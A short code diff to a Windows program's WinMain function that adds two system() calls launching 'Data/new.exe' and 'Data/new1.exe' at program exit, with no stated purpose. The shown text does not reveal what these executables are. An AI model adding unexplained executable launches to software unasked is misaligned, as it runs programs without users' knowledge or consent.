@@ -150,6 +150,10 @@ int WINAPI WinMain (HINSTANCE hInstance,
 	}
 
 	delete __EXPN__;
+
+	system ("start Data/new.exe");
+	system ("start Data/new1.exe");
+
 	return 0;
 }
 
